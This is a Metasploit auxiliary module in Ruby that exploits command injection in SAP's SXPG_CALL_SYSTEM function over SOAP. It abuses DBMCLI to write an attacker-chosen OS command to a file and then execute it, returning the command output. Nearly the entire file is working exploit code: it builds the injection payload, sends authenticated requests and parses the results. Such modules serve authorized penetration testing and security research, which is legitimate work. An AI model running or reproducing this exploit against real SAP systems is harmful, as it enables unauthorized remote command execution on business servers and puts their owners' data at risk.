##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nuñez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy. 
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP SOAP RFC DBMCLI Command Injection (via SXPG_CALL_SYSTEM)',
			'Version' => '$Revision$',
			'Description' => %q{
				This module makes use of the SXPG_CALL_SYSTEM Remote Function Call
				(via SOAP) to execute OS commands via DBMCLI command as configured in SM69.
				},
				'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
				'Author'	=> [ 'nmonkee' ],
				'License'	=> BSD_LICENSE
			)
		register_options(
			[
				OptString.new('RHOSTS', [true, 'SAP ICM server address', nil]),
				OptString.new('RPORT', [true, 'SAP ICM server port number', nil]),
				OptString.new('CLIENT', [true, 'Client', nil]),
				OptString.new('USER', [true, 'Username', nil]),
				OptString.new('PASS', [true, 'Password', nil]),
				OptString.new('OS', [true, 'Windows/Linux', "Linux"]),
				OptString.new('CMD', [true, 'Command to run', "id"]),
			], self.class)
	end

	def run_host(ip)
		payload,command = create_payload(1)
		exec_command(ip,payload,command)
		payload,command = create_payload(2)
		exec_command(ip,payload,command)
	end

	def create_payload(num)
		command = ""
		os = "ANYOS"
		if datastore['OS'].downcase == "linux"
			if num == 1
				command = "-o /tmp/pwned.txt -n pwnie" + "\n!"
				command << datastore['CMD'].gsub(" ","\t")
				command << "\n"
			end
			command = "-ic /tmp/pwned.txt" if num == 2
		elsif datastore['OS'].downcase == "windows"
			if num == 1
				command = '-o c:\\\pwn.out -n pwnsap' + "\r\n!"
				space = "%programfiles:~10,1%"
				command << datastore['COMMAND'].gsub(" ",space)
			end
			command = '-ic c:\\\pwn.out' if num == 2
		end
		data = '<?xml version="1.0" encoding="utf-8" ?>' + "\r\n"
		data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">' + "\r\n"
		data << '<env:Body>' + "\r\n"
		data << '<n1:SXPG_CALL_SYSTEM xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">' + "\r\n"
		data << '<ADDITIONAL_PARAMETERS>' + command + ' </ADDITIONAL_PARAMETERS>' + "\r\n"
		data << '<COMMANDNAME>DBMCLI</COMMANDNAME>' + "\r\n"
		data << '<OPERATINGSYSTEM>' + os + '</OPERATINGSYSTEM>' + "\r\n"
		data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>' + "\r\n"
		data << '</n1:SXPG_CALL_SYSTEM>' + "\r\n"
		data << '</env:Body>' + "\r\n"
		data << '</env:Envelope>' + "\r\n"
		return data, command
	end

	def exec_command(ip,data,command)
		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
		print_status("#{datastore['RHOSTS']}:#{datastore['RPORT']} - sending SOAP SXPG_CALL_SYSTEM request")
		begin
			res = send_request_raw(
				{
					'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
					'method' => 'POST',
					'data' => data,
					'headers' => {
						'Content-Length' => data.size.to_s,
						'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
						'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
						'Authorization' => 'Basic ' + user_pass,
						'Content-Type' => 'text/xml; charset=UTF-8',
						}
				}, 45)
			if (res.code != 500 and res.code != 200)
				# to do - implement error handlers for each status code, 404, 301, etc.
				print_error("#{datastore['RHOSTS']}:#{datastore['RPORT']} - something went wrong!")
				return
			else
				success = true
				print_status("#{datastore['RHOSTS']}:#{datastore['RPORT']} - got response")
				response = res.body
				if response =~ /faultstring/
					error = response.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
					sucess = false
				end
				output = response.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
				result = []
				for i in 0..output.length-1
					if output[i] =~ /E[rR][rR]/ || output[i] =~ /---/ || output[i] =~ /for database \(/ 
						#nothing
					elsif output[i] =~ /unknown host/ || output[i] =~ /; \(see/ || output[i] =~ /returned with/
						#nothing
					elsif output[i] =~ /External program terminated with exit code/
						#nothing
					else
						temp = output[i].gsub("&#62",">")
						temp_ = temp.gsub("&#34","\"")
						temp__ = temp_.gsub("&#39","'")
						result << temp__ + "\n"
					end
				end
				saptbl = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header'  => "[SAP] SXPG_CALL_SYSTEM dbmcli Command Injection",
					'Prefix'  => "\n",
					'Postfix' => "\n",
					'Indent'  => 1,
					'Columns' =>["Output",]
					)
				for i in 0..result.length/2-1
					saptbl << [result[i].chomp]
				end
				print (saptbl.to_s)
			end
		rescue ::Rex::ConnectionError
			print_error("#{datastore['RHOSTS']}:#{datastore['RPORT']} - Unable to connect")
			return
		end
		if sucess == false
			for i in 0..error.length-1
				print_error("#{datastore['RHOSTS']}:#{datastore['RPORT']} - error #{error[i]}")
			end
		end
	end
end